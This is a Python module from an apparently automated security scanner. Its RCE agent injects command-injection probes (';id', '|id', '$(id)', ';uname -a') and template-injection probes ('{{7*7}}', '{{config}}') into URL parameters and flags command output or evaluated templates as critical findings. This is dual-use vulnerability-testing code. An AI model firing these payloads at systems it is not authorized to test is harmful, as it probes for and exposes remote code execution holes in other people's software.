"""RCE Attack Agent — Command injection, SSTI, deserialization 🤖"""
import re
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient
from briar.core.params import RCE_CMD as RCE_PARAMS, merge_params

class RCEAgent:
    """Discovers Remote Code Execution vulnerabilities with real payloads"""

    CMD_PAYLOADS = [
        (";id", "semicolon"),
        ("|id", "pipe"),
        ("`id`", "backtick"),
        ("$(id)", "subshell"),
        ("&&id", "and_and"),
        (";uname -a", "uname"),
        ("|uname -a", "pipe_uname"),
    ]

    SSTI_PAYLOADS = [
        ("{{7*7}}", "jinja2"),
        ("${7*7}", "jstl"),
        ("<%= 7*7 %>", "erb"),
        ("{{config}}", "jinja2_config"),
        ("#{7*7}", "ruby"),
    ]

    CMD_MARKERS = [
        (r"uid=\d+\([^)]+\)\s+gid=\d+", "id command output"),
        (r"uid=\d+\([^)]+\)", "id command output"),
        (r"Linux [\w.-]+ \d+\.\d+\.\d+", "uname -a output"),
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=10)
        self.name = "RCE"

    def scan(self, url: str, tech_context: str = "", **kwargs) -> dict:
        """Scan for RCE vulnerabilities (command injection + SSTI)"""
        findings = []
        rce_params = merge_params(url, RCE_PARAMS)

        for param in rce_params[:8]:
            # Baseline with a benign value — a real marker must be NEW vs this.
            try:
                base = self.http.send_payload(url, param, "briarbase123")
                base_text = base.get("text_snippet", "") if "error" not in base else ""
            except Exception:
                base_text = ""

            # Command injection — the command output must appear because of our payload
            for payload, cmd_type in self.CMD_PAYLOADS:
                try:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue
                    text = result.get("text_snippet", "")
                    hit = None
                    for pattern, desc in self.CMD_MARKERS:
                        m = re.search(pattern, text)
                        if m and m.group(0) not in base_text:
                            hit = desc
                            break
                    if hit:
                        findings.append({
                            "type": f"Command Injection ({cmd_type})",
                            "severity": "Critical", "param": param, "payload": payload,
                            "rce_type": "command_injection", "detected": hit,
                        })
                        break
                except Exception:
                    pass

            if findings:
                break

            # SSTI — 7*7 must evaluate to 49 (new vs baseline) AND the payload must
            # NOT be reflected raw (raw reflection = not evaluated = not vulnerable)
            for payload, engine in self.SSTI_PAYLOADS:
                if "7*7" not in payload:
                    continue
                try:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue
                    text = result.get("text_snippet", "")
                    if "49" in text and "49" not in base_text and payload not in text:
                        findings.append({
                            "type": f"SSTI ({engine})",
                            "severity": "Critical", "param": param, "payload": payload,
                            "rce_type": "ssti", "detected": "7*7 evaluated to 49 (not reflected raw)",
                        })
                        break
                except Exception:
                    pass

            if findings:
                break

        if not findings:
            findings.append({"type": "No RCE/SSTI detected", "severity": "Info"})

        analysis = f"RCE scan complete for {url}\n\n"
        real_vulns = [f for f in findings if f["severity"] in ("Critical",)]
        if real_vulns:
            analysis += f"**{len(real_vulns)} RCE/SSTI vulnerabilities found:**\n\n"
            for f in real_vulns:
                analysis += f"- **{f['type']}**: param `{f['param']}` — {f.get('detected','')} (payload: `{f['payload']}`)\n"
            analysis += "\n---\n\nLLM analysis of real RCE findings:\n"

        result = self.analyzer.analyze_endpoint(url, "GET/POST", tech_context=tech_context, source_hint= analysis)
        result["real_findings"] = findings
        result["agent"] = self.name
        result["type"] = "RCE"
        result["severity"] = "Critical" if real_vulns else "Info"
        return result
